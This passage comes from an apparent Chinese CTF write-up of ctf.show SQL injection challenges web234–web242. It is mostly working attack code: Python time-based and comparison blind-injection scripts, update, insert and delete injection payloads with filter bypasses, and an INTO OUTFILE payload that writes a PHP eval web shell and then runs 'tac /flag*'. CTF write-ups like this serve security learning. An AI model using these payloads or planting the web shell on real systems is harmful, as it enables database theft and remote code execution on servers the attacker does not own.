+    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>
+
+
+<span class="token comment"># 数据库名</span>
+<span class="token comment"># payload = "database()"</span>
+<span class="token comment"># 爆表名  </span>
+<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
+<span class="token comment"># 爆列名</span>
+<span class="token comment"># payload = f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name={strToHex(table_name)}"</span>
+<span class="token comment">#爆字段值</span>
+payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>flag<span class="token punctuation">}</span></span><span class="token string"> from </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>table_name<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    head <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+
+    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+
+        <span class="token comment">#sleep(1)</span>
+        
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span> <span class="token comment"># 中间指针等于头尾指针相加的一半</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token string">'username'</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f" where username =  0x63746673686f77 and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(3),1)#"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token string">"\\"</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span>
+            tail <span class="token operator">=</span> mid 
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span> <span class="token comment">#sleep导致超时</span>
+
+    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+</code></pre>
+<h2><a id="web235update_440"></a>web235(update注入)</h2>
+<p>发现or被过滤了,infomation不能用了,可以用sys或者mysql库替代</p>
+<p>查表名</p>
+<pre><code class="prism language-mysql">select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();
+select group_concat(table_name)from mysql.innodb_index_stats where database_name=database();
+</code></pre>
+<p>这里要用到无列名盲注,可以看我的博客</p>
+<p><a href="https://kradress.github.io/2021/11/28/SQL%E6%B3%A8%E5%85%A5.html#%E6%97%A0%E5%88%97%E5%90%8D%E7%9B%B2%E6%B3%A8">无列名盲注</a></p>
+<h3><a id="union_452"></a>union重命名法</h3>
+<pre><code>password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
+</code></pre>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a4e474b78e6a4ef38d7885c17f4db45f.png"/><br/> 这三种都可以,limit 1,1 是因为第一行是1,2,3</p>
+<pre><code>password=\&amp;username=,username=(select a.2 from (select 1,2,3 union select * from flag23a1 limit 1,1)a)#
+password=\&amp;username=,username=(select `2` from (select 1,2,3 union select * from flag23a1 limit 1,1)a)#
+password=\&amp;username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#
+</code></pre>
+<h3><a id="_466"></a>比较法盲注</h3>
+<pre><code class="prism language-py"><span class="token comment"># @Author:Kradress</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+
+url <span class="token operator">=</span> <span class="token string">"http://99c6146f-7390-4303-9c69-8bad06dfd783.challenge.ctf.show/api/"</span>
+table_name <span class="token operator">=</span> <span class="token string">'flag23a1'</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token keyword">def</span> <span class="token function">strToHex</span><span class="token punctuation">(</span>S <span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> s <span class="token keyword">in</span> S<span class="token punctuation">:</span>
+        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>
+
+uuid <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">"{-,_}"</span>
+<span class="token comment"># 数据库名</span>
+<span class="token comment"># payload = "database()"</span>
+<span class="token comment"># 爆表名  </span>
+<span class="token comment"># payload = "select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()"</span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token comment"># 爆表名</span>
+            <span class="token comment"># 'username' : f" where username =  0x63746673686f77 and if(ascii(substr(({payload}),{i},1))={j},sleep(3),1)#",</span>
+            <span class="token comment"># 比较法盲注</span>
+            <span class="token string">'username'</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f" where username =  0x63746673686f77 and if(((select 0x31,</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>strToHex<span class="token punctuation">(</span>result<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>strToHex<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">)&lt;(select * from </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>table_name<span class="token punctuation">}</span></span><span class="token string"> limit 0,1)),1,sleep(3))#"</span></span><span class="token punctuation">,</span>
+            <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token string">"\\"</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#sleep导致超时</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+
+</code></pre>
+<h2><a id="web236update_514"></a>web236(update注入)</h2>
+<p>多过滤了一个flag,不过在用比较法盲注解的时候,发现并不影响.说明这里应该是过滤flag的回显</p>
+<h3><a id="_518"></a>比较法盲注</h3>
+<p>同上</p>
+<h3><a id="union_522"></a>union重命名法</h3>
+<p>拿到表名<code>flaga</code></p>
+<pre><code>password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
+</code></pre>
+<p>这里对flag的回显做编码处理</p>
+<p><a href="https://kradress.github.io/2021/11/28/SQL%E6%B3%A8%E5%85%A5.html#%E8%BF%87%E6%BB%A4%E5%9B%9E%E6%98%BE%E5%86%85%E5%AE%B9">过滤回显内容</a></p>
+<pre><code>password=\&amp;username=,username=(select to_base64(a.2) from (select 1,2 ,3 union select * from flaga limit 1,1)a)#
+</code></pre>
+<h2><a id="web237insert_536"></a>web237(insert注入)</h2>
+<pre><code class="prism language-php">  <span class="token comment">//插入数据</span>
+  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into ctfshow_user(username,pass) value('<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$username</span><span class="token punctuation">}</span></span>','<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$password</span><span class="token punctuation">}</span></span>');"</span><span class="token punctuation">;</span>
+</code></pre>
+<p>可以用再<code>{username}</code>处用<code>\</code>对<code>'</code>进行转义</p>
+<pre><code>username=as\&amp;password=,database());#
+</code></pre>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/958052deaf464030814d9ad7e197f2e6.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/29129b4dc0c34399aac6905f51a522b5.png"/></p>
+<pre><code>#查表名
+username=as\&amp;password=,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#
+#查字段
+username=as\&amp;password=,(select group_concat(column_name) from information_schema.columns where table_name='flag'));#
+# 查flag
+username=as\&amp;password=,(select group_concat(flagass23s3) from flag));#
+</code></pre>
+<h2><a id="web238insert_556"></a>web238(insert过滤)</h2>
+<p>过滤了个空格,不影响</p>
+<p>除了<code>()</code>其他貌似都用不了</p>
+<pre><code>#查表名
+username=as\&amp;password=,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#
+#查字段
+username=as\&amp;password=,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')));#
+# 查flag
+username=as\&amp;password=,(select group_concat(flagass23s3) from flag));#
+</code></pre>
+<h2><a id="web239insert_569"></a>web239(insert过滤)</h2>
+<p>过滤空格或or,information不能用了</p>
+<p>可以用其它数据库代替,但是只能查表名</p>
+<p>查表名</p>
+<pre><code>username=as\&amp;password=,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())));#
+</code></pre>
+<p>这里查字段可以用union重命名法,因为过滤了空格,在limit 1,1这里想不到怎么去绕过空格的过滤</p>
+<p>好在字段名还是flag</p>
+<pre><code>username=as\&amp;password=,(select(flag)from`flagbb`));#
+</code></pre>
+<h2><a id="web240insert_586"></a>web240(insert过滤)</h2>
+<pre><code>  //过滤空格 or sys mysql
+</code></pre>
+<p>把查表名的方法都堵死了,看hint,大概就是写个脚本把所有可能都枚举一遍就好啦</p>
+<pre><code>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写
+</code></pre>
+<p>懒得写脚本,可以看看其他师傅wp,我这里直接用burp</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d3cdaf5d31834007b22540e855f93300.png"/></p>
+<p>写脚本的话可以跑完再查询数据,也可以每发一个包然后再发一个包看数据里面是否包含<code>ctfshow{<!-- --></code></p>
+<h2><a id="web241delete_604"></a>web241(delete注入)</h2>
+<pre><code>  //删除记录
+  $sql = "delete from  ctfshow_user where id = {$id}";
+</code></pre>
+<p>抓个包<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ad6452259abb439eb32c183916a6087e.png"/><br/> 这里可以用时间盲注</p>
+<p>这里用二分法时间盲注</p>
+<pre><code class="prism language-py"><span class="token comment"># @Author:Kradress</span>
+<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://a5227021-9f03-4528-8827-243db8331e31.challenge.ctf.show/api/delete.php"</span>
+table_name <span class="token operator">=</span> <span class="token string">'flag'</span>
+flag <span class="token operator">=</span> <span class="token string">'flag'</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token keyword">def</span> <span class="token function">strToHex</span><span class="token punctuation">(</span>S <span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> s <span class="token keyword">in</span> S<span class="token punctuation">:</span>
+        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>
+
+<span class="token comment"># 数据库名</span>
+<span class="token comment"># payload = "database()"</span>
+<span class="token comment"># 爆表名  </span>
+<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
+<span class="token comment"># 爆列名</span>
+<span class="token comment"># payload = f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{table_name}'"</span>
+<span class="token comment">#爆字段值</span>
+payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>flag<span class="token punctuation">}</span></span><span class="token string"> from </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>table_name<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    head <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+
+    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+
+        <span class="token comment">#sleep(1)</span>
+        
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span> <span class="token comment"># 中间指针等于头尾指针相加的一半</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token string">'id'</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(0.01),-1)#"</span></span><span class="token punctuation">,</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">)</span>
+            tail <span class="token operator">=</span> mid 
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span> <span class="token comment">#sleep导致超时</span>
+
+    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+</code></pre>
+<p>刚开始是sleep(3),timeout=2.5,没跑出来,看页面发现响应时间有点长,把sleep时间调小点就好了<br/> <code>if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(0.01),-1)#</code></p>
+<h2><a id="web242_669"></a>web242(文件读写)</h2>
+<pre><code class="prism language-php">  <span class="token comment">//备份表</span>
+  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from ctfshow_user into outfile '/var/www/html/dump/<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$filename</span><span class="token punctuation">}</span></span>';"</span><span class="token punctuation">;</span>
+</code></pre>
+<p>不会做,直接看其他师傅的wp</p>
+<p>这里是利用info outfile的扩展参数</p>
+<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'file_name'</span>
+        <span class="token punctuation">[</span><span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> charset_name<span class="token punctuation">]</span>
+        <span class="token punctuation">[</span>export_options<span class="token punctuation">]</span>
+
+export_options:
+    <span class="token punctuation">[</span>{<!-- --><span class="token keyword">FIELDS</span> <span class="token operator">|</span> <span class="token keyword">COLUMNS</span>}
+        <span class="token punctuation">[</span><span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">'string'</span><span class="token punctuation">]</span><span class="token comment">//分隔符</span>
+        <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token keyword">OPTIONALLY</span><span class="token punctuation">]</span> <span class="token keyword">ENCLOSED</span> <span class="token keyword">BY</span> <span class="token string">'char'</span><span class="token punctuation">]</span>
+        <span class="token punctuation">[</span><span class="token keyword">ESCAPED</span> <span class="token keyword">BY</span> <span class="token string">'char'</span><span class="token punctuation">]</span>
+    <span class="token punctuation">]</span>
+    <span class="token punctuation">[</span><span class="token keyword">LINES</span>
+        <span class="token punctuation">[</span><span class="token keyword">STARTING</span> <span class="token keyword">BY</span> <span class="token string">'string'</span><span class="token punctuation">]</span>
+        <span class="token punctuation">[</span><span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">'string'</span><span class="token punctuation">]</span>
+    <span class="token punctuation">]</span>
+</code></pre>
+<pre><code class="prism language-sql">“<span class="token keyword">OPTION</span>”参数为可选参数选项，其可能的取值有：
+
+<span class="token identifier"><span class="token punctuation">`</span>FIELDS TERMINATED BY '字符串'<span class="token punctuation">`</span></span>：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
+
+<span class="token identifier"><span class="token punctuation">`</span>FIELDS ENCLOSED BY '字符'<span class="token punctuation">`</span></span>：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
+
+<span class="token identifier"><span class="token punctuation">`</span>FIELDS OPTIONALLY ENCLOSED BY '字符'<span class="token punctuation">`</span></span>：设置字符来括住<span class="token keyword">CHAR</span>、<span class="token keyword">VARCHAR</span>和<span class="token keyword">TEXT</span>等字符型字段。默认情况下不使用任何符号。
+
+<span class="token identifier"><span class="token punctuation">`</span>FIELDS ESCAPED BY '字符'<span class="token punctuation">`</span></span>：设置转义字符，只能为单个字符。默认值为“\”。
+
+<span class="token identifier"><span class="token punctuation">`</span>LINES STARTING BY '字符串'<span class="token punctuation">`</span></span>：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
+
+<span class="token identifier"><span class="token punctuation">`</span>LINES TERMINATED BY '字符串'<span class="token punctuation">`</span></span>：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
+
+</code></pre>
+<p>可以写马的参数有：</p>
+<p><code>FIELDS TERMINATED BY、 LINES STARTING BY、 LINES TERMINATED BY</code></p>
+<p>点击<code>导出</code>抓包</p>
+<pre><code>filename=1.php' LINES STARTING BY "&lt;?php eval($_POST[1]);?&gt;";#
+</code></pre>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7e788e709bfb4a6a8c62d37655ebdf48.png"/><br/> 访问<code>/dump/1.php</code></p>
+<pre><code>POST
+
+1=system("tac /flag*");
+</code></pre>
+<h1><a id="_730"></a>题解</h1>
+<p><font color="#999AAA">################################</font></p>
+<hr color="#000000" size='1"'/>
+<h1><a id="_735"></a>总结</h1>
+<p><font color="#999AAA">…</font></p>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
